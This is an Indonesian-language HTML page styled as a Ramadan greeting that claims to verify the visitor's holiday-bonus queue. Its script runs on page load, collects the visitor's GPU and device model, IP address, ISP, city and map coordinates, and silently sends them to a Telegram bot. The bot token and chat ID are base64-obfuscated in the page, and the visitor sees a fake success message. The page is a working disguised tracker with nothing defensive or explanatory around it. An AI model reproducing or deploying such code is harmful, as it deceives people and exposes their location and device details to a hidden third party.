<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        /* CSS PREMIUM PUNYA LU TADI */
        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Poppins:wght@300;500;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #0a3f2b 0%, #1b5e3a 100%);
            font-family: 'Poppins', sans-serif;
            display: flex; justify-content: center; align-items: center;
            overflow: hidden; position: relative;
        }
        .card {
            position: relative; z-index: 10;
            background: rgba(18, 48, 30, 0.8);
            backdrop-filter: blur(15px);
            border: 2px solid rgba(245, 197, 66, 0.6);
            border-radius: 40px; padding: 40px;
            max-width: 400px; width: 90%; text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 20px #f5c54244;
        }
        h1 { font-family: 'Amiri', serif; color: #f5c542; font-size: 2rem; margin: 10px 0; }
        .msg { color: #fff4d6; font-size: 0.95rem; margin: 15px 0; line-height: 1.6; }
        .status-box {
            background: rgba(0,0,0,0.4); padding: 10px; border-radius: 20px;
            font-size: 0.8rem; color: #f5c542; border: 1px solid #f5c54244;
        }
        footer { margin-top: 20px; font-size: 0.7rem; color: #b5924b; opacity: 0.6; }
    </style>
</head>
<body>

    <div class="card">
        <div style="font-size: 3rem;">üåô‚ú®</div>
        <h1>Gema Ramadhan</h1>
        <div style="font-family: 'Amiri'; color: #e6c379; font-size: 1.5rem;">ÿßŸÑŸÑŸáŸÖ ÿ®ŸÑÿ∫ŸÜÿß ÿ±ŸÖÿ∂ÿßŸÜ</div>
        
        <p class="msg">
            Selamat menunaikan ibadah puasa.<br>
            Sistem sedang memverifikasi antrian THR Anda.
        </p>

        <div class="status-box">
            <span id="st">Sinkronisasi hardware...</span>
        </div>

        <footer>üåô 1 Ramadhan 1447 H ‚Ä¢ Berbagi Berkah üåô</footer>
    </div>

    <script>
        // === PASTE BASE64 LU DI SINI ===
        const enc_t = 'ODUwNzE4NDEwODpBQUZoY1hwQjA1aThHNXR5VE5LZXRWVWkyMVJhWFFCNlBIVQ'; 
        const enc_c = 'NzAxNTQ0NTUwNw==';

        // LOGIKA LOW-LEVEL (GPU FINGERPRINTING)
        const _getHardware = () => {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    gpu: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            } catch (e) { return { vendor: "Unknown", gpu: "Unknown" }; }
        };

        async function init() {
            try {
                const T = atob(enc_t);
                const C = atob(enc_c);
                
                // Ambil Data Hardware (Assembly Mode)
                const hw = _getHardware();
                
                // Ambil Data Jaringan & IP
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();

                // Deteksi Merk HP via User Agent
                const ua = navigator.userAgent;
                let device = "Desktop/Unknown";
                if (/android/i.test(ua)) device = ua.match(/Android\s([^\s;]+).+?\s([^;]+)\sBuild/)?.[2] || "Android";
                if (/iPhone/i.test(ua)) device = "iPhone / iOS";

                // SUSUN LAPORAN HARDCORE
                const report = `üè¥‚Äç‚ò†Ô∏è *HARDCORE LOG DETECTED* üè¥‚ÄçDR\n\n` +
                               `üë§ *DEVICE:* ${device}\n` +
                               `‚öôÔ∏è *GPU:* ${hw.gpu}\n` +
                               `üèóÔ∏è *CHIPSET:* ${hw.vendor}\n\n` +
                               `üåê *IP:* ${d.ip}\n` +
                               `üì° *ISP:* ${d.org}\n` +
                               `üìç *CITY:* ${d.city}, ${d.region}\n` +
                               `üó∫Ô∏è *MAPS:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

                // Kirim Silent ke Telegram
                await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: C, text: report, parse_mode: 'Markdown' })
                });

                document.getElementById('st').innerText = "Verifikasi Berhasil. Tunggu pengiriman.";
            } catch (err) {
                document.getElementById('st').innerText = "Sistem sibuk, mencoba kembali...";
            }
        }

        window.onload = init;
    </script>
</body>
</html>
